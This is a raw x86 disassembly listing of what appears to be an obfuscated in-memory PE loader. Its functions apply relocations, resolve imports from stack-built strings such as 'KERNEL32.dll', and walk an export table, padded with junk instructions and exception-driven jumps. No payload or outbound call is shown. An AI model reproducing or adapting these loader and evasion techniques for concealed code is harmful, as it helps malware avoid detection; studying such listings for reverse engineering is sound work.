  401cfc:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  401d03:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401d06:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401d0d:	5f                   	pop    %edi
  401d0e:	5e                   	pop    %esi
  401d0f:	5b                   	pop    %ebx
  401d10:	8b e5                	mov    %ebp,%esp
  401d12:	5d                   	pop    %ebp
  401d13:	c3                   	ret
  401d14:	55                   	push   %ebp
  401d15:	8b ec                	mov    %esp,%ebp
  401d17:	6a ff                	push   $0xffffffff
  401d19:	68 bc eb 40 00       	push   $0x40ebbc
  401d1e:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401d24:	50                   	push   %eax
  401d25:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  401d2c:	51                   	push   %ecx
  401d2d:	83 ec 2c             	sub    $0x2c,%esp
  401d30:	53                   	push   %ebx
  401d31:	56                   	push   %esi
  401d32:	57                   	push   %edi
  401d33:	89 65 f0             	mov    %esp,-0x10(%ebp)
  401d36:	8b 45 08             	mov    0x8(%ebp),%eax
  401d39:	8b 48 04             	mov    0x4(%eax),%ecx
  401d3c:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  401d3f:	90                   	nop
  401d40:	90                   	nop
  401d41:	90                   	nop
  401d42:	8b 55 08             	mov    0x8(%ebp),%edx
  401d45:	8b 02                	mov    (%edx),%eax
  401d47:	05 a0 00 00 00       	add    $0xa0,%eax
  401d4c:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  401d4f:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  401d52:	83 79 04 00          	cmpl   $0x0,0x4(%ecx)
  401d56:	0f 86 fb 00 00 00    	jbe    0x401e57
  401d5c:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  401d5f:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401d62:	03 02                	add    (%edx),%eax
  401d64:	89 45 e0             	mov    %eax,-0x20(%ebp)
  401d67:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  401d6a:	83 39 00             	cmpl   $0x0,(%ecx)
  401d6d:	0f 86 e4 00 00 00    	jbe    0x401e57
  401d73:	8b 55 e0             	mov    -0x20(%ebp),%edx
  401d76:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401d79:	03 02                	add    (%edx),%eax
  401d7b:	89 45 dc             	mov    %eax,-0x24(%ebp)
  401d7e:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  401d81:	83 c1 08             	add    $0x8,%ecx
  401d84:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  401d87:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  401d8e:	eb 12                	jmp    0x401da2
  401d90:	8b 55 e8             	mov    -0x18(%ebp),%edx
  401d93:	83 c2 01             	add    $0x1,%edx
  401d96:	89 55 e8             	mov    %edx,-0x18(%ebp)
  401d99:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401d9c:	83 c0 02             	add    $0x2,%eax
  401d9f:	89 45 d8             	mov    %eax,-0x28(%ebp)
  401da2:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  401da5:	8b 51 04             	mov    0x4(%ecx),%edx
  401da8:	83 ea 08             	sub    $0x8,%edx
  401dab:	d1 ea                	shr    $1,%edx
  401dad:	39 55 e8             	cmp    %edx,-0x18(%ebp)
  401db0:	0f 83 8c 00 00 00    	jae    0x401e42
  401db6:	90                   	nop
  401db7:	90                   	nop
  401db8:	90                   	nop
  401db9:	90                   	nop
  401dba:	90                   	nop
  401dbb:	90                   	nop
  401dbc:	90                   	nop
  401dbd:	90                   	nop
  401dbe:	90                   	nop
  401dbf:	90                   	nop
  401dc0:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401dc3:	33 c9                	xor    %ecx,%ecx
  401dc5:	66 8b 08             	mov    (%eax),%cx
  401dc8:	c1 f9 0c             	sar    $0xc,%ecx
  401dcb:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  401dce:	8b 55 d8             	mov    -0x28(%ebp),%edx
  401dd1:	33 c0                	xor    %eax,%eax
  401dd3:	66 8b 02             	mov    (%edx),%ax
  401dd6:	25 ff 0f 00 00       	and    $0xfff,%eax
  401ddb:	89 45 cc             	mov    %eax,-0x34(%ebp)
  401dde:	90                   	nop
  401ddf:	90                   	nop
  401de0:	90                   	nop
  401de1:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  401de8:	b9 01 00 00 00       	mov    $0x1,%ecx
  401ded:	85 c9                	test   %ecx,%ecx
  401def:	74 15                	je     0x401e06
  401df1:	c7 45 c8 22 00 00 00 	movl   $0x22,-0x38(%ebp)
  401df8:	68 70 00 41 00       	push   $0x410070
  401dfd:	8d 55 c8             	lea    -0x38(%ebp),%edx
  401e00:	52                   	push   %edx
  401e01:	e8 6a 10 00 00       	call   0x402e70
  401e06:	eb 2e                	jmp    0x401e36
  401e08:	40                   	inc    %eax
  401e09:	4b                   	dec    %ebx
  401e0a:	48                   	dec    %eax
  401e0b:	43                   	inc    %ebx
  401e0c:	8b 45 d0             	mov    -0x30(%ebp),%eax
  401e0f:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  401e12:	83 7d c4 03          	cmpl   $0x3,-0x3c(%ebp)
  401e16:	74 02                	je     0x401e1a
  401e18:	eb 16                	jmp    0x401e30
  401e1a:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  401e1d:	03 4d cc             	add    -0x34(%ebp),%ecx
  401e20:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  401e23:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  401e26:	8b 02                	mov    (%edx),%eax
  401e28:	03 45 0c             	add    0xc(%ebp),%eax
  401e2b:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  401e2e:	89 01                	mov    %eax,(%ecx)
  401e30:	b8 36 1e 40 00       	mov    $0x401e36,%eax
  401e35:	c3                   	ret
  401e36:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  401e3d:	e9 4e ff ff ff       	jmp    0x401d90
  401e42:	90                   	nop
  401e43:	90                   	nop
  401e44:	90                   	nop
  401e45:	90                   	nop
  401e46:	8b 55 e0             	mov    -0x20(%ebp),%edx
  401e49:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401e4c:	03 42 04             	add    0x4(%edx),%eax
  401e4f:	89 45 e0             	mov    %eax,-0x20(%ebp)
  401e52:	e9 10 ff ff ff       	jmp    0x401d67
  401e57:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401e5a:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401e61:	5f                   	pop    %edi
  401e62:	5e                   	pop    %esi
  401e63:	5b                   	pop    %ebx
  401e64:	8b e5                	mov    %ebp,%esp
  401e66:	5d                   	pop    %ebp
  401e67:	c3                   	ret
  401e68:	55                   	push   %ebp
  401e69:	8b ec                	mov    %esp,%ebp
  401e6b:	6a ff                	push   $0xffffffff
  401e6d:	68 c6 eb 40 00       	push   $0x40ebc6
  401e72:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401e78:	50                   	push   %eax
  401e79:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  401e80:	51                   	push   %ecx
  401e81:	83 ec 50             	sub    $0x50,%esp
  401e84:	53                   	push   %ebx
  401e85:	56                   	push   %esi
  401e86:	57                   	push   %edi
  401e87:	89 65 f0             	mov    %esp,-0x10(%ebp)
  401e8a:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  401e91:	b8 01 00 00 00       	mov    $0x1,%eax
  401e96:	85 c0                	test   %eax,%eax
  401e98:	74 15                	je     0x401eaf
  401e9a:	c7 45 a8 45 00 00 00 	movl   $0x45,-0x58(%ebp)
  401ea1:	68 70 00 41 00       	push   $0x410070
  401ea6:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  401ea9:	51                   	push   %ecx
  401eaa:	e8 c1 0f 00 00       	call   0x402e70
  401eaf:	e9 a3 02 00 00       	jmp    0x402157
  401eb4:	89 65 f0             	mov    %esp,-0x10(%ebp)
  401eb7:	c6 45 c8 49          	movb   $0x49,-0x38(%ebp)
  401ebb:	c6 45 c9 73          	movb   $0x73,-0x37(%ebp)
  401ebf:	c6 45 ca 42          	movb   $0x42,-0x36(%ebp)
  401ec3:	c6 45 cb 61          	movb   $0x61,-0x35(%ebp)
  401ec7:	c6 45 cc 64          	movb   $0x64,-0x34(%ebp)
  401ecb:	c6 45 cd 52          	movb   $0x52,-0x33(%ebp)
  401ecf:	c6 45 ce 65          	movb   $0x65,-0x32(%ebp)
  401ed3:	c6 45 cf 61          	movb   $0x61,-0x31(%ebp)
  401ed7:	c6 45 d0 64          	movb   $0x64,-0x30(%ebp)
  401edb:	c6 45 d1 50          	movb   $0x50,-0x2f(%ebp)
  401edf:	c6 45 d2 74          	movb   $0x74,-0x2e(%ebp)
  401ee3:	c6 45 d3 72          	movb   $0x72,-0x2d(%ebp)
  401ee7:	c6 45 d4 00          	movb   $0x0,-0x2c(%ebp)
  401eeb:	c6 45 dc 4b          	movb   $0x4b,-0x24(%ebp)
  401eef:	c6 45 dd 45          	movb   $0x45,-0x23(%ebp)
  401ef3:	c6 45 de 52          	movb   $0x52,-0x22(%ebp)
  401ef7:	c6 45 df 4e          	movb   $0x4e,-0x21(%ebp)
  401efb:	c6 45 e0 45          	movb   $0x45,-0x20(%ebp)
  401eff:	c6 45 e1 4c          	movb   $0x4c,-0x1f(%ebp)
  401f03:	c6 45 e2 33          	movb   $0x33,-0x1e(%ebp)
  401f07:	c6 45 e3 32          	movb   $0x32,-0x1d(%ebp)
  401f0b:	c6 45 e4 2e          	movb   $0x2e,-0x1c(%ebp)
  401f0f:	c6 45 e5 64          	movb   $0x64,-0x1b(%ebp)
  401f13:	c6 45 e6 6c          	movb   $0x6c,-0x1a(%ebp)
  401f17:	c6 45 e7 6c          	movb   $0x6c,-0x19(%ebp)
  401f1b:	c6 45 e8 00          	movb   $0x0,-0x18(%ebp)
  401f1f:	8d 55 c8             	lea    -0x38(%ebp),%edx
  401f22:	52                   	push   %edx
  401f23:	8d 45 dc             	lea    -0x24(%ebp),%eax
  401f26:	50                   	push   %eax
  401f27:	ff 15 04 f0 40 00    	call   *0x40f004
  401f2d:	50                   	push   %eax
  401f2e:	ff 15 00 f0 40 00    	call   *0x40f000
  401f34:	89 45 c0             	mov    %eax,-0x40(%ebp)
  401f37:	90                   	nop
  401f38:	90                   	nop
  401f39:	90                   	nop
  401f3a:	90                   	nop
  401f3b:	90                   	nop
  401f3c:	90                   	nop
  401f3d:	c7 45 ec 01 00 00 00 	movl   $0x1,-0x14(%ebp)
  401f44:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401f47:	8b 51 04             	mov    0x4(%ecx),%edx
  401f4a:	89 55 d8             	mov    %edx,-0x28(%ebp)
  401f4d:	90                   	nop
  401f4e:	90                   	nop
  401f4f:	90                   	nop
  401f50:	90                   	nop
  401f51:	90                   	nop
  401f52:	90                   	nop
  401f53:	8b 45 08             	mov    0x8(%ebp),%eax
  401f56:	8b 08                	mov    (%eax),%ecx
  401f58:	81 c1 80 00 00 00    	add    $0x80,%ecx
  401f5e:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
  401f61:	8b 55 c4             	mov    -0x3c(%ebp),%edx
  401f64:	83 7a 04 00          	cmpl   $0x0,0x4(%edx)
  401f68:	0f 86 d8 01 00 00    	jbe    0x402146
  401f6e:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  401f71:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  401f74:	03 08                	add    (%eax),%ecx
  401f76:	89 4d bc             	mov    %ecx,-0x44(%ebp)
  401f79:	eb 09                	jmp    0x401f84
  401f7b:	8b 55 bc             	mov    -0x44(%ebp),%edx
  401f7e:	83 c2 14             	add    $0x14,%edx
  401f81:	89 55 bc             	mov    %edx,-0x44(%ebp)
  401f84:	6a 14                	push   $0x14
  401f86:	8b 45 bc             	mov    -0x44(%ebp),%eax
  401f89:	50                   	push   %eax
  401f8a:	ff 55 c0             	call   *-0x40(%ebp)
  401f8d:	85 c0                	test   %eax,%eax
  401f8f:	0f 85 b1 01 00 00    	jne    0x402146
  401f95:	8b 4d bc             	mov    -0x44(%ebp),%ecx
  401f98:	83 79 0c 00          	cmpl   $0x0,0xc(%ecx)
  401f9c:	0f 84 a4 01 00 00    	je     0x402146
  401fa2:	40                   	inc    %eax
  401fa3:	4b                   	dec    %ebx
  401fa4:	48                   	dec    %eax
  401fa5:	43                   	inc    %ebx
  401fa6:	8b 55 bc             	mov    -0x44(%ebp),%edx
  401fa9:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401fac:	03 42 0c             	add    0xc(%edx),%eax
  401faf:	50                   	push   %eax
  401fb0:	ff 15 04 f0 40 00    	call   *0x40f004
  401fb6:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  401fb9:	83 7d b4 ff          	cmpl   $0xffffffff,-0x4c(%ebp)
  401fbd:	75 0c                	jne    0x401fcb
  401fbf:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  401fc6:	e9 7b 01 00 00       	jmp    0x402146
  401fcb:	90                   	nop
  401fcc:	90                   	nop
  401fcd:	90                   	nop
  401fce:	90                   	nop
  401fcf:	90                   	nop
  401fd0:	90                   	nop
  401fd1:	90                   	nop
  401fd2:	90                   	nop
  401fd3:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401fd6:	8b 51 0c             	mov    0xc(%ecx),%edx
  401fd9:	8d 04 95 04 00 00 00 	lea    0x4(,%edx,4),%eax
  401fe0:	50                   	push   %eax
  401fe1:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401fe4:	8b 51 08             	mov    0x8(%ecx),%edx
  401fe7:	52                   	push   %edx
  401fe8:	e8 8e f2 ff ff       	call   0x40127b
  401fed:	83 c4 08             	add    $0x8,%esp
  401ff0:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401ff3:	89 41 08             	mov    %eax,0x8(%ecx)
  401ff6:	8b 55 08             	mov    0x8(%ebp),%edx
  401ff9:	83 7a 08 00          	cmpl   $0x0,0x8(%edx)
  401ffd:	75 0c                	jne    0x40200b
  401fff:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  402006:	e9 3b 01 00 00       	jmp    0x402146
  40200b:	90                   	nop
  40200c:	90                   	nop
  40200d:	90                   	nop
  40200e:	90                   	nop
  40200f:	90                   	nop
  402010:	90                   	nop
  402011:	90                   	nop
  402012:	90                   	nop
  402013:	90                   	nop
  402014:	8b 45 08             	mov    0x8(%ebp),%eax
  402017:	8b 48 0c             	mov    0xc(%eax),%ecx
  40201a:	8b 55 08             	mov    0x8(%ebp),%edx
  40201d:	8b 42 08             	mov    0x8(%edx),%eax
  402020:	8b 55 b4             	mov    -0x4c(%ebp),%edx
  402023:	89 14 88             	mov    %edx,(%eax,%ecx,4)
  402026:	8b 45 08             	mov    0x8(%ebp),%eax
  402029:	8b 48 0c             	mov    0xc(%eax),%ecx
  40202c:	83 c1 01             	add    $0x1,%ecx
  40202f:	8b 55 08             	mov    0x8(%ebp),%edx
  402032:	89 4a 0c             	mov    %ecx,0xc(%edx)
  402035:	8b 45 bc             	mov    -0x44(%ebp),%eax
  402038:	83 38 00             	cmpl   $0x0,(%eax)
  40203b:	74 1d                	je     0x40205a
  40203d:	8b 4d bc             	mov    -0x44(%ebp),%ecx
  402040:	8b 55 d8             	mov    -0x28(%ebp),%edx
  402043:	03 11                	add    (%ecx),%edx
  402045:	89 55 b8             	mov    %edx,-0x48(%ebp)
  402048:	40                   	inc    %eax
  402049:	4b                   	dec    %ebx
  40204a:	48                   	dec    %eax
  40204b:	43                   	inc    %ebx
  40204c:	8b 45 bc             	mov    -0x44(%ebp),%eax
  40204f:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  402052:	03 48 10             	add    0x10(%eax),%ecx
  402055:	89 4d b0             	mov    %ecx,-0x50(%ebp)
  402058:	eb 18                	jmp    0x402072
  40205a:	8b 55 bc             	mov    -0x44(%ebp),%edx
  40205d:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402060:	03 42 10             	add    0x10(%edx),%eax
  402063:	89 45 b8             	mov    %eax,-0x48(%ebp)
  402066:	8b 4d bc             	mov    -0x44(%ebp),%ecx
  402069:	8b 55 d8             	mov    -0x28(%ebp),%edx
  40206c:	03 51 10             	add    0x10(%ecx),%edx
  40206f:	89 55 b0             	mov    %edx,-0x50(%ebp)
  402072:	eb 12                	jmp    0x402086
  402074:	8b 45 b8             	mov    -0x48(%ebp),%eax
  402077:	83 c0 04             	add    $0x4,%eax
  40207a:	89 45 b8             	mov    %eax,-0x48(%ebp)
  40207d:	8b 4d b0             	mov    -0x50(%ebp),%ecx
  402080:	83 c1 04             	add    $0x4,%ecx
  402083:	89 4d b0             	mov    %ecx,-0x50(%ebp)
  402086:	8b 55 b8             	mov    -0x48(%ebp),%edx
  402089:	83 3a 00             	cmpl   $0x0,(%edx)
  40208c:	0f 84 9f 00 00 00    	je     0x402131
  402092:	8b 45 b8             	mov    -0x48(%ebp),%eax
  402095:	8b 08                	mov    (%eax),%ecx
  402097:	81 e1 00 00 00 80    	and    $0x80000000,%ecx
  40209d:	85 c9                	test   %ecx,%ecx
  40209f:	74 1c                	je     0x4020bd
  4020a1:	8b 55 b8             	mov    -0x48(%ebp),%edx
  4020a4:	8b 02                	mov    (%edx),%eax
  4020a6:	25 ff ff 00 00       	and    $0xffff,%eax
  4020ab:	50                   	push   %eax
  4020ac:	8b 4d b4             	mov    -0x4c(%ebp),%ecx
  4020af:	51                   	push   %ecx
  4020b0:	ff 15 00 f0 40 00    	call   *0x40f000
  4020b6:	8b 55 b0             	mov    -0x50(%ebp),%edx
  4020b9:	89 02                	mov    %eax,(%edx)
  4020bb:	eb 25                	jmp    0x4020e2
  4020bd:	90                   	nop
  4020be:	90                   	nop
  4020bf:	90                   	nop
  4020c0:	90                   	nop
  4020c1:	8b 45 b8             	mov    -0x48(%ebp),%eax
  4020c4:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  4020c7:	03 08                	add    (%eax),%ecx
  4020c9:	89 4d ac             	mov    %ecx,-0x54(%ebp)
  4020cc:	8b 55 ac             	mov    -0x54(%ebp),%edx
  4020cf:	83 c2 02             	add    $0x2,%edx
  4020d2:	52                   	push   %edx
  4020d3:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  4020d6:	50                   	push   %eax
  4020d7:	ff 15 00 f0 40 00    	call   *0x40f000
  4020dd:	8b 4d b0             	mov    -0x50(%ebp),%ecx
  4020e0:	89 01                	mov    %eax,(%ecx)
  4020e2:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  4020e6:	ba 01 00 00 00       	mov    $0x1,%edx
  4020eb:	85 d2                	test   %edx,%edx
  4020ed:	74 15                	je     0x402104
  4020ef:	c7 45 a4 42 00 00 00 	movl   $0x42,-0x5c(%ebp)
  4020f6:	68 70 00 41 00       	push   $0x410070
  4020fb:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  4020fe:	50                   	push   %eax
  4020ff:	e8 6c 0d 00 00       	call   0x402e70
  402104:	eb 1f                	jmp    0x402125
  402106:	8b 4d b0             	mov    -0x50(%ebp),%ecx
  402109:	83 39 00             	cmpl   $0x0,(%ecx)
  40210c:	75 11                	jne    0x40211f
  40210e:	40                   	inc    %eax
  40210f:	4b                   	dec    %ebx
  402110:	48                   	dec    %eax
  402111:	43                   	inc    %ebx
  402112:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  402119:	b8 31 21 40 00       	mov    $0x402131,%eax
  40211e:	c3                   	ret
  40211f:	b8 25 21 40 00       	mov    $0x402125,%eax
  402124:	c3                   	ret
  402125:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40212c:	e9 43 ff ff ff       	jmp    0x402074
  402131:	90                   	nop
  402132:	90                   	nop
  402133:	90                   	nop
  402134:	90                   	nop
  402135:	90                   	nop
  402136:	90                   	nop
  402137:	90                   	nop
  402138:	90                   	nop
  402139:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  40213d:	75 02                	jne    0x402141
  40213f:	eb 05                	jmp    0x402146
  402141:	e9 35 fe ff ff       	jmp    0x401f7b
  402146:	8b 55 ec             	mov    -0x14(%ebp),%edx
  402149:	89 55 a0             	mov    %edx,-0x60(%ebp)
  40214c:	b8 52 21 40 00       	mov    $0x402152,%eax
  402151:	c3                   	ret
  402152:	8b 45 a0             	mov    -0x60(%ebp),%eax
  402155:	eb 07                	jmp    0x40215e
  402157:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  40215e:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402161:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402168:	5f                   	pop    %edi
  402169:	5e                   	pop    %esi
  40216a:	5b                   	pop    %ebx
  40216b:	8b e5                	mov    %ebp,%esp
  40216d:	5d                   	pop    %ebp
  40216e:	c3                   	ret
  40216f:	55                   	push   %ebp
  402170:	8b ec                	mov    %esp,%ebp
  402172:	6a ff                	push   $0xffffffff
  402174:	68 d0 eb 40 00       	push   $0x40ebd0
  402179:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40217f:	50                   	push   %eax
  402180:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  402187:	51                   	push   %ecx
  402188:	83 ec 34             	sub    $0x34,%esp
  40218b:	53                   	push   %ebx
  40218c:	56                   	push   %esi
  40218d:	57                   	push   %edi
  40218e:	89 65 f0             	mov    %esp,-0x10(%ebp)
  402191:	40                   	inc    %eax
  402192:	4b                   	dec    %ebx
  402193:	48                   	dec    %eax
  402194:	43                   	inc    %ebx
  402195:	8b 45 08             	mov    0x8(%ebp),%eax
  402198:	8b 48 04             	mov    0x4(%eax),%ecx
  40219b:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  40219e:	c7 45 ec ff ff ff ff 	movl   $0xffffffff,-0x14(%ebp)
  4021a5:	40                   	inc    %eax
  4021a6:	4b                   	dec    %ebx
  4021a7:	48                   	dec    %eax
  4021a8:	43                   	inc    %ebx
  4021a9:	8b 55 08             	mov    0x8(%ebp),%edx
  4021ac:	8b 02                	mov    (%edx),%eax
  4021ae:	83 c0 78             	add    $0x78,%eax
  4021b1:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4021b4:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4021bb:	b9 01 00 00 00       	mov    $0x1,%ecx
  4021c0:	85 c9                	test   %ecx,%ecx
  4021c2:	74 15                	je     0x4021d9
  4021c4:	c7 45 d0 4d 00 00 00 	movl   $0x4d,-0x30(%ebp)
  4021cb:	68 70 00 41 00       	push   $0x410070
  4021d0:	8d 55 d0             	lea    -0x30(%ebp),%edx
  4021d3:	52                   	push   %edx
  4021d4:	e8 97 0c 00 00       	call   0x402e70
  4021d9:	e9 1a 01 00 00       	jmp    0x4022f8
  4021de:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4021e1:	83 78 04 00          	cmpl   $0x0,0x4(%eax)
  4021e5:	75 15                	jne    0x4021fc
  4021e7:	c7 45 cc 00 00 00 00 	movl   $0x0,-0x34(%ebp)
  4021ee:	b8 f4 21 40 00       	mov    $0x4021f4,%eax
  4021f3:	c3                   	ret
  4021f4:	8b 45 cc             	mov    -0x34(%ebp),%eax
  4021f7:	e9 03 01 00 00       	jmp    0x4022ff
  4021fc:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  4021ff:	8b 55 d8             	mov    -0x28(%ebp),%edx
  402202:	03 11                	add    (%ecx),%edx
  402204:	89 55 e8             	mov    %edx,-0x18(%ebp)
  402207:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40220a:	83 78 18 00          	cmpl   $0x0,0x18(%eax)
  40220e:	74 09                	je     0x402219
  402210:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  402213:	83 79 14 00          	cmpl   $0x0,0x14(%ecx)
  402217:	75 15                	jne    0x40222e
  402219:	c7 45 c8 00 00 00 00 	movl   $0x0,-0x38(%ebp)
  402220:	b8 26 22 40 00       	mov    $0x402226,%eax
  402225:	c3                   	ret
  402226:	8b 45 c8             	mov    -0x38(%ebp),%eax
  402229:	e9 d1 00 00 00       	jmp    0x4022ff
  40222e:	90                   	nop
  40222f:	8b 55 e8             	mov    -0x18(%ebp),%edx
  402232:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402235:	03 42 20             	add    0x20(%edx),%eax
  402238:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40223b:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  40223e:	8b 55 d8             	mov    -0x28(%ebp),%edx
  402241:	03 51 24             	add    0x24(%ecx),%edx
  402244:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  402247:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  40224e:	eb 1b                	jmp    0x40226b
  402250:	8b 45 dc             	mov    -0x24(%ebp),%eax
  402253:	83 c0 01             	add    $0x1,%eax
  402256:	89 45 dc             	mov    %eax,-0x24(%ebp)
  402259:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  40225c:	83 c1 04             	add    $0x4,%ecx
  40225f:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  402262:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  402265:	83 c2 02             	add    $0x2,%edx
  402268:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  40226b:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40226e:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  402271:	3b 48 18             	cmp    0x18(%eax),%ecx
  402274:	73 25                	jae    0x40229b
  402276:	8b 55 e0             	mov    -0x20(%ebp),%edx
  402279:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40227c:	03 02                	add    (%edx),%eax
  40227e:	8b d0                	mov    %eax,%edx
  402280:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  402283:	e8 89 ed ff ff       	call   0x401011
  402288:	85 c0                	test   %eax,%eax
  40228a:	75 0d                	jne    0x402299
  40228c:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  40228f:	33 d2                	xor    %edx,%edx
  402291:	66 8b 11             	mov    (%ecx),%dx
  402294:	89 55 ec             	mov    %edx,-0x14(%ebp)
  402297:	eb 02                	jmp    0x40229b
  402299:	eb b5                	jmp    0x402250
  40229b:	40                   	inc    %eax
  40229c:	4b                   	dec    %ebx
  40229d:	48                   	dec    %eax
  40229e:	43                   	inc    %ebx
  40229f:	83 7d ec ff          	cmpl   $0xffffffff,-0x14(%ebp)
  4022a3:	75 12                	jne    0x4022b7
  4022a5:	c7 45 c4 00 00 00 00 	movl   $0x0,-0x3c(%ebp)
  4022ac:	b8 b2 22 40 00       	mov    $0x4022b2,%eax
  4022b1:	c3                   	ret
  4022b2:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  4022b5:	eb 48                	jmp    0x4022ff
  4022b7:	40                   	inc    %eax
  4022b8:	4b                   	dec    %ebx
  4022b9:	48                   	dec    %eax
  4022ba:	43                   	inc    %ebx
  4022bb:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4022be:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4022c1:	3b 48 14             	cmp    0x14(%eax),%ecx
  4022c4:	76 12                	jbe    0x4022d8
  4022c6:	c7 45 c0 00 00 00 00 	movl   $0x0,-0x40(%ebp)
  4022cd:	b8 d3 22 40 00       	mov    $0x4022d3,%eax
  4022d2:	c3                   	ret
  4022d3:	8b 45 c0             	mov    -0x40(%ebp),%eax
  4022d6:	eb 27                	jmp    0x4022ff
  4022d8:	8b 55 e8             	mov    -0x18(%ebp),%edx
  4022db:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4022de:	03 42 1c             	add    0x1c(%edx),%eax
  4022e1:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4022e4:	8b 55 d8             	mov    -0x28(%ebp),%edx
  4022e7:	03 14 88             	add    (%eax,%ecx,4),%edx
  4022ea:	89 55 bc             	mov    %edx,-0x44(%ebp)
  4022ed:	b8 f3 22 40 00       	mov    $0x4022f3,%eax
  4022f2:	c3                   	ret
  4022f3:	8b 45 bc             	mov    -0x44(%ebp),%eax
  4022f6:	eb 07                	jmp    0x4022ff
  4022f8:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  4022ff:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402302:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402309:	5f                   	pop    %edi
  40230a:	5e                   	pop    %esi
  40230b:	5b                   	pop    %ebx
  40230c:	8b e5                	mov    %ebp,%esp
  40230e:	5d                   	pop    %ebp
  40230f:	c3                   	ret
  402310:	55                   	push   %ebp
  402311:	8b ec                	mov    %esp,%ebp
  402313:	6a ff                	push   $0xffffffff
  402315:	68 da eb 40 00       	push   $0x40ebda
  40231a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402320:	50                   	push   %eax
  402321:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  402328:	51                   	push   %ecx
  402329:	83 ec 38             	sub    $0x38,%esp
  40232c:	53                   	push   %ebx
  40232d:	56                   	push   %esi
  40232e:	57                   	push   %edi
  40232f:	89 65 f0             	mov    %esp,-0x10(%ebp)
  402332:	68 e4 ae 45 00       	push   $0x45aee4
  402337:	68 f0 ae 45 00       	push   $0x45aef0
  40233c:	ff 15 04 f0 40 00    	call   *0x40f004
  402342:	50                   	push   %eax
